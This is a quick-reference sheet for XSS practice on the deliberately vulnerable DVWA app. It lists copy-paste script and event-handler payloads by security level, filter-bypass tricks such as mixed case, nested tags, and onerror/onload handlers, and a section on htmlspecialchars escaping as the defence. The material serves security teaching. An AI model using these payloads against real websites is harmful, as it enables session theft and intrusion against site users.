# XSS Practice -- Quick Reference

## DVWA URL Paths

| Module | URL Path |
|---|---|
| Reflected XSS | `/vulnerabilities/xss_r/` |
| Stored XSS | `/vulnerabilities/xss_s/` |

---

## Copy-Paste Payloads

### Low Level

| Purpose | Payload |
|---|---|
| Basic alert | `<script>alert('XSS')</script>` |
| Cookie theft | `<script>alert(document.cookie)</script>` |
| Stored (Name field) | `Hacker` |
| Stored (Message field) | `<script>alert('Stored XSS')</script>` |

### Medium Level

| Purpose | Payload |
|---|---|
| Mixed case bypass | `<Script>alert('XSS')</Script>` |
| Nested tag bypass | `<scr<script>ipt>alert('XSS')</scr</script>ipt>` |
| Event handler bypass | `<img src=x onerror=alert('XSS')>` |

### High Level

| Purpose | Payload |
|---|---|
| img event handler | `<img src=x onerror=alert('XSS')>` |
| svg event handler | `<svg onload=alert('XSS')>` |

### Impossible Level

No payloads work. All output is escaped with `htmlspecialchars()`.

---

## Security Level Comparison

| Level | What's Filtered | Bypass Method | Works? |
|---|---|---|---|
| Low | Nothing | Direct `<script>` tag | Yes |
| Medium | Exact `<script>` string (lowercase) | Mixed case, nested tags, event handlers | Yes |
| High | `<script>` tag in all case variations (regex) | Event handlers (`onerror`, `onload`) | Yes |
| Impossible | All special characters escaped via `htmlspecialchars()` | None | No |

---

## Book Chapter References

| Section | Topic |
|---|---|
| 4.3.1 | XSS basics -- what it is and why it happens |
| 4.3.2 | Reflected XSS in detail, with `43-001.php` example |
| 4.3 (countermeasures) | `htmlspecialchars()` as the primary defense |

---

## Common Mistakes

- **Filtering only `<script>` tags**: There are dozens of HTML elements and event handlers that execute JavaScript. Blacklisting specific tags is always incomplete.
- **Case-sensitive filtering**: Using `str_replace('<script>', '', $input)` misses `<Script>`, `<SCRIPT>`, etc.
- **Filtering on input instead of escaping on output**: Input filtering can be bypassed. The correct approach is to escape data at the point where it is inserted into HTML.
- **Forgetting `ENT_QUOTES`**: Calling `htmlspecialchars()` without `ENT_QUOTES` leaves single quotes unescaped, which can be exploited in certain attribute contexts.
- **Missing charset parameter**: Omitting the charset in `htmlspecialchars()` can lead to multi-byte character exploits in some PHP versions.

---

## Key Function

The book's recommended defense:

```php
htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
```

This converts:

| Character | Entity |
|---|---|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#039;` |
| `&` | `&amp;` |
